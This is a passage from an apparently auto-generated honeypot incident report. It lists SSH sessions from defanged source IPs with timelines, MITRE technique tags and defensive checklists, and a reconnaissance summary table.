- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baba100e63f3

| Field | Detail |
|---|---|
| **Source IP** | `217.208.90[.]253` |
| **First Seen** | 2026-11-17 00:55 |
| **Last Seen** | 2026-11-17 00:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:55:26` | `cowrie.session.connect` |
| `2026-11-17 00:55:26` | `cowrie.client.version` |
| `2026-11-17 00:55:26` | `cowrie.client.kex` |
| `2026-11-17 00:55:28` | `cowrie.login.success` |
| `2026-11-17 00:55:29` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.208.90[.]253` to AbuseIPDB if not already reported
- [ ] Block `217.208.90[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaa0ca58d5b2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-17 00:56 |
| **Last Seen** | 2026-11-17 00:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:56:13` | `cowrie.session.connect` |
| `2026-11-17 00:56:13` | `cowrie.client.version` |
| `2026-11-17 00:56:13` | `cowrie.client.kex` |
| `2026-11-17 00:56:13` | `cowrie.login.success` |
| `2026-11-17 00:56:13` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:56:13` | `cowrie.direct-tcpip.ja4` |
| `2026-11-17 00:56:13` | `cowrie.direct-tcpip.data` |
| `2026-11-17 00:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9b42e30518

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-17 00:57 |
| **Last Seen** | 2026-11-17 00:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:57:20` | `cowrie.session.connect` |
| `2026-11-17 00:57:20` | `cowrie.client.version` |
| `2026-11-17 00:57:20` | `cowrie.client.kex` |
| `2026-11-17 00:57:21` | `cowrie.login.success` |
| `2026-11-17 00:57:21` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:57:21` | `cowrie.direct-tcpip.ja4` |
| `2026-11-17 00:57:21` | `cowrie.direct-tcpip.data` |
| `2026-11-17 00:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b129ca485155

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-17 00:57 |
| **Last Seen** | 2026-11-17 00:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 00:57:49` | `cowrie.session.connect` |
| `2026-11-17 00:57:49` | `cowrie.client.version` |
| `2026-11-17 00:57:49` | `cowrie.client.kex` |
| `2026-11-17 00:57:50` | `cowrie.login.success` |
| `2026-11-17 00:57:50` | `cowrie.direct-tcpip.request` |
| `2026-11-17 00:57:50` | `cowrie.direct-tcpip.ja4` |
| `2026-11-17 00:57:50` | `cowrie.direct-tcpip.data` |
| `2026-11-17 00:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b15e892e6c9

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-11-17 01:01 |
| **Last Seen** | 2026-11-17 01:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 01:01:35` | `cowrie.session.connect` |
| `2026-11-17 01:01:35` | `cowrie.client.version` |
| `2026-11-17 01:01:35` | `cowrie.client.kex` |
| `2026-11-17 01:01:36` | `cowrie.login.success` |
| `2026-11-17 01:01:37` | `cowrie.session.params` |
| `2026-11-17 01:01:37` | `cowrie.command.input` |
| `2026-11-17 01:01:37` | `cowrie.log.closed` |
| `2026-11-17 01:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c24c483dc859

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]53` |
| **First Seen** | 2026-11-17 01:04 |
| **Last Seen** | 2026-11-17 01:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 01:04:36` | `cowrie.session.connect` |
| `2026-11-17 01:04:37` | `cowrie.client.version` |
| `2026-11-17 01:04:37` | `cowrie.client.kex` |
| `2026-11-17 01:04:40` | `cowrie.login.success` |
| `2026-11-17 01:04:41` | `cowrie.direct-tcpip.request` |
| `2026-11-17 01:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]53` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-450c3a35ad1e

| Field | Detail |
|---|---|
| **Source IP** | `41.72.125[.]86` |
| **First Seen** | 2026-11-17 01:04 |
| **Last Seen** | 2026-11-17 01:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 01:04:47` | `cowrie.session.connect` |
| `2026-11-17 01:04:48` | `cowrie.client.version` |
| `2026-11-17 01:04:48` | `cowrie.client.kex` |
| `2026-11-17 01:04:51` | `cowrie.login.success` |
| `2026-11-17 01:04:52` | `cowrie.direct-tcpip.request` |
| `2026-11-17 01:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.72.125[.]86` to AbuseIPDB if not already reported
- [ ] Block `41.72.125[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b467e0659c2a

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-11-17 01:08 |
| **Last Seen** | 2026-11-17 01:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-17 01:08:55` | `cowrie.session.connect` |
| `2026-11-17 01:08:56` | `cowrie.client.version` |
| `2026-11-17 01:08:56` | `cowrie.client.kex` |
| `2026-11-17 01:08:58` | `cowrie.login.success` |
| `2026-11-17 01:08:59` | `cowrie.direct-tcpip.request` |
| `2026-11-17 01:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (128) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-77fe9225930c | HIGH | `102.210.148[.]41` | 2026-11-17 01:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32c3fdf27337 | HIGH | `160.154.84[.]192` | 2026-11-17 01:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b14527251be2 | HIGH | `24.45.235[.]179` | 2026-11-17 01:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db9ee19bdefd | HIGH | `192.136.235[.]68` | 2026-11-17 01:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c80f71fb2dd2 | HIGH | `41.44.171[.]62` | 2026-11-17 01:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a92cbca5e8ba | HIGH | `61.2.246[.]139` | 2026-11-17 01:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-419986103a60 | HIGH | `70.183.226[.]20` | 2026-11-17 01:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2bc162676eb1 | HIGH | `200.175.61[.]207` | 2026-11-17 01:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dbcfa75d4797 | HIGH | `116.86.211[.]61` | 2026-11-17 01:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4466889e72d5 | HIGH | `200.175.61[.]207` | 2026-11-17 01:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-015a9cb1d381 | HIGH | `121.178.185[.]141` | 2026-11-17 01:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6df215d53c19 | HIGH | `65.20.143[.]19` | 2026-11-17 01:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e29f040e85cf | HIGH | `128.199.173[.]169` | 2026-11-17 01:18 | Y | 6 | 0 | `T1059.004 · T1078 · T1105` |
| IR-159579d8ddcc | HIGH | `82.162.17[.]177` | 2026-11-17 01:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e3c49811bac1 | HIGH | `73.183.115[.]109` | 2026-11-17 01:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23a6474cdbd0 | HIGH | `36.92.140[.]209` | 2026-11-17 01:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fdb4f2072b30 | HIGH | `36.92.140[.]209` | 2026-11-17 01:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-40538f427896 | HIGH | `20.184.59[.]236` | 2026-11-17 01:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bb93064a8b01 | HIGH | `20.184.59[.]236` | 2026-11-17 01:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-03461f2c2dd1 | HIGH | `43.133.61[.]254` | 2026-11-17 01:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bb82dd68dcad | HIGH | `43.133.61[.]254` | 2026-11-17 01:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-25d05966e12c | HIGH | `186.121.233[.]2` | 2026-11-17 01:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-361e988ce187 | HIGH | `186.121.233[.]2` | 2026-11-17 01:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ece546e750f9 | HIGH | `144.22.238[.]238` | 2026-11-17 01:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eb8c2c958767 | HIGH | `197.44.15[.]210` | 2026-11-17 01:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bcfe584dac28 | HIGH | `197.44.15[.]210` | 2026-11-17 01:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b502aae10f34 | HIGH | `174.68.44[.]195` | 2026-11-17 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d2998ffe716c | HIGH | `50.80.140[.]207` | 2026-11-17 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e2b80d94c933 | HIGH | `31.208.14[.]62` | 2026-11-17 02:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-da08e1641fd1 | HIGH | `93.164.134[.]141` | 2026-11-17 02:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-11813d9c33e5 | HIGH | `77.239.124[.]252` | 2026-11-17 02:02 | Y | 0 | 0 | `T1078` |
| IR-96c4b174aca8 | HIGH | `131.161.184[.]46` | 2026-11-17 02:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8b3f3b1c99c9 | HIGH | `194.103.82[.]72` | 2026-11-17 02:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea67d23bfed1 | HIGH | `35.210.162[.]204` | 2026-11-17 02:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2a6bcf049147 | HIGH | `213.212.48[.]179` | 2026-11-17 02:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de6fee215040 | HIGH | `68.225.58[.]228` | 2026-11-17 02:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-050754f8f2a5 | HIGH | `176.53.159[.]196` | 2026-11-17 02:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5fe4767505fd | HIGH | `8.243.73[.]199` | 2026-11-17 02:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0c90d385cbe8 | HIGH | `68.225.56[.]110` | 2026-11-17 02:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-11691bd1cd47 | HIGH | `182.75.227[.]178` | 2026-11-17 02:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-906d6de7d865 | HIGH | `219.248.4[.]146` | 2026-11-17 02:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2658ddabad3f | HIGH | `103.146.233[.]154` | 2026-11-17 02:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-026f3565f097 | HIGH | `83.254.172[.]36` | 2026-11-17 02:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3408dcea0d45 | HIGH | `196.189.236[.]67` | 2026-11-17 02:37 | Y | 10 | 0 | `T1003.008 · T1059.004 · T1078` |
| IR-01f273935fec | HIGH | `195.178.110[.]217` | 2026-11-17 02:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5308b431ac83 | HIGH | `195.178.110[.]217` | 2026-11-17 02:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-500ac92d5354 | HIGH | `195.178.110[.]217` | 2026-11-17 02:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-197123003154 | HIGH | `195.178.110[.]217` | 2026-11-17 02:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9cf52b62605c | HIGH | `195.178.110[.]217` | 2026-11-17 02:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4b7e12713da4 | HIGH | `195.178.110[.]217` | 2026-11-17 02:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-26033640e84d | HIGH | `195.178.110[.]217` | 2026-11-17 02:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8cc16f69f7ec | HIGH | `195.178.110[.]217` | 2026-11-17 02:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a6d9e4224c4f | HIGH | `195.178.110[.]217` | 2026-11-17 02:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0d852eb38f23 | HIGH | `195.178.110[.]217` | 2026-11-17 02:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-db87bb28bea1 | HIGH | `195.178.110[.]217` | 2026-11-17 02:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-73f39d75104a | HIGH | `195.178.110[.]217` | 2026-11-17 02:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a56f4a4d1ade | HIGH | `195.178.110[.]78` | 2026-11-17 02:59 | Y | 0 | 0 | `T1078` |
| IR-c4da043f7e38 | HIGH | `195.178.110[.]217` | 2026-11-17 03:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-93b1cf4b7c85 | HIGH | `195.178.110[.]217` | 2026-11-17 03:01 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bb79ee72dac6 | HIGH | `213.230.127[.]104` | 2026-11-17 03:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-31f8584c4ee8 | HIGH | `213.230.127[.]104` | 2026-11-17 03:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d4b7c6f0e690 | HIGH | `195.178.110[.]217` | 2026-11-17 03:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-da00e92dca9b | HIGH | `195.178.110[.]217` | 2026-11-17 03:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-029e24dcbdf9 | HIGH | `195.178.110[.]217` | 2026-11-17 03:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bb0aee279665 | HIGH | `195.178.110[.]217` | 2026-11-17 03:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fbfa5b3377ed | HIGH | `59.144.92[.]154` | 2026-11-17 03:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-761b14b6314f | HIGH | `195.178.110[.]217` | 2026-11-17 03:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-41dec96a6b9c | HIGH | `59.144.92[.]154` | 2026-11-17 03:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5f5e4cd413df | HIGH | `195.178.110[.]217` | 2026-11-17 03:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3b53bdb03815 | HIGH | `195.178.110[.]217` | 2026-11-17 03:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-07597860cfb0 | HIGH | `195.178.110[.]217` | 2026-11-17 03:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b1f1f11a0763 | HIGH | `195.178.110[.]217` | 2026-11-17 03:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-493a00a951a4 | HIGH | `195.178.110[.]217` | 2026-11-17 03:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-672b62425e74 | HIGH | `195.178.110[.]217` | 2026-11-17 03:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-89c1c26d0844 | HIGH | `195.178.110[.]217` | 2026-11-17 03:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9927772385d6 | HIGH | `195.178.110[.]217` | 2026-11-17 03:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-423fb443f6f0 | HIGH | `49.207.9[.]39` | 2026-11-17 03:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-69b3828819d3 | HIGH | `195.178.110[.]217` | 2026-11-17 03:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-109085d754f5 | HIGH | `89.233.202[.]252` | 2026-11-17 03:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ad41421a181 | HIGH | `195.178.110[.]217` | 2026-11-17 03:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b968823987d8 | HIGH | `195.178.110[.]217` | 2026-11-17 03:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2929c25da36a | HIGH | `195.178.110[.]217` | 2026-11-17 03:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6aafd4ff0a51 | HIGH | `201.17.133[.]138` | 2026-11-17 03:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-28f8f82d634d | HIGH | `201.17.133[.]138` | 2026-11-17 03:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fbe5f4e50c13 | HIGH | `195.178.110[.]217` | 2026-11-17 03:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6060a38d6f21 | HIGH | `195.178.110[.]217` | 2026-11-17 03:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-141890a1ae2a | HIGH | `195.178.110[.]217` | 2026-11-17 03:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-18a64b1bab15 | HIGH | `195.178.110[.]217` | 2026-11-17 03:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e25828711ca4 | HIGH | `195.178.110[.]217` | 2026-11-17 03:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7a537b8fc366 | HIGH | `195.178.110[.]217` | 2026-11-17 03:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f847f6aa5d07 | HIGH | `195.178.110[.]217` | 2026-11-17 03:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c44964b4fdae | HIGH | `195.178.110[.]217` | 2026-11-17 03:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5489762c6094 | HIGH | `195.178.110[.]217` | 2026-11-17 03:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b665a6f5feab | HIGH | `195.178.110[.]217` | 2026-11-17 03:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f1dd4465fc91 | HIGH | `195.178.110[.]217` | 2026-11-17 03:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7431d0cadb76 | HIGH | `195.178.110[.]217` | 2026-11-17 03:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9bd34c35f496 | HIGH | `195.178.110[.]217` | 2026-11-17 03:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e840603f71f2 | HIGH | `195.178.110[.]217` | 2026-11-17 03:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2c6cff8c99c6 | HIGH | `195.178.110[.]217` | 2026-11-17 03:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-469dbde0c889 | HIGH | `195.178.110[.]217` | 2026-11-17 03:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
_… 28 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **2** | 2026-11-17 02:41 | 2026-11-17 04:39 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-17 02:59 | 2026-11-17 04:12 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-17 00:18 | 2026-11-17 02:02 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `103.158.138[.]179` | 1 | 2026-11-17 03:21 | 2026-11-17 03:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]120` | 1 | 2026-11-17 00:27 | 2026-11-17 00:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]134` | 1 | 2026-11-17 00:19 | 2026-11-17 00:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.123.116[.]93` | 1 | 2026-11-17 04:39 | 2026-11-17 04:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-11-17 00:40 | 2026-11-17 00:41 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `160.3.5[.]133` | 1 | 2026-11-17 00:00 | 2026-11-17 00:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `170.244.186[.]155` | 1 | 2026-11-17 01:34 | 2026-11-17 01:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-17 02:48 | 2026-11-17 02:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-17 00:53 | 2026-11-17 00:53 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `20.115.49[.]24` | 1 | 2026-11-17 02:35 | 2026-11-17 02:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.98.44[.]218` | 1 | 2026-11-17 01:09 | 2026-11-17 01:09 | 9s | 0 | `T1592` | 🟢 LOW |
| `223.109.200[.]181` | 1 | 2026-11-17 02:09 | 2026-11-17 02:09 | 10s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-17 00:54 | 2026-11-17 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.41.94[.]250` | 1 | 2026-11-17 00:42 | 2026-11-17 00:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.176[.]149` | 1 | 2026-11-17 04:49 | 2026-11-17 04:49 | 4s | 0 | `T1592` | 🟢 LOW |
| `35.210.162[.]204` | 1 | 2026-11-17 02:20 | 2026-11-17 02:20 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.218[.]50` | 1 | 2026-11-17 04:25 | 2026-11-17 04:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.228[.]188` | 1 | 2026-11-17 04:03 | 2026-11-17 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.71[.]76` | 1 | 2026-11-17 03:49 | 2026-11-17 03:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.77.150[.]71` | 1 | 2026-11-17 03:39 | 2026-11-17 03:39 | 1s | 0 | `T1592` | 🟢 LOW |
| `39.105.56[.]130` | 1 | 2026-11-17 04:50 | 2026-11-17 04:50 | 3s | 0 | `T1592` | 🟢 LOW |
| `43.142.14[.]199` | 1 | 2026-11-17 00:03 | 2026-11-17 00:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.238.2[.]117` | 1 | 2026-11-17 03:19 | 2026-11-17 03:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]26` | 1 | 2026-11-17 03:18 | 2026-11-17 03:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.91.188[.]73` | 1 | 2026-11-17 01:24 | 2026-11-17 01:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `59.126.149[.]222` | 1 | 2026-11-17 02:16 | 2026-11-17 02:16 | 24s | 0 | `T1592` | 🟢 LOW |
| `61.184.128[.]210` | 1 | 2026-11-17 04:54 | 2026-11-17 04:54 | 3s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-11-17 03:46 | 2026-11-17 03:46 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]206` | 1 | 2026-11-17 02:30 | 2026-11-17 02:30 | 4s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]69` | 1 | 2026-11-17 01:39 | 2026-11-17 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]37` | 1 | 2026-11-17 00:33 | 2026-11-17 00:33 | 3s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-17 03:51 | 2026-11-17 03:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-17 04:30 | 2026-11-17 04:31 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-17 01:01 | 2026-11-17 01:01 | 6s | 0 | `T1592` | 🟢 LOW |
| `81.209.169[.]77` | 1 | 2026-11-17 03:32 | 2026-11-17 03:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `82.147.85[.]98` | 1 | 2026-11-17 01:40 | 2026-11-17 01:40 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (865 sample(s))

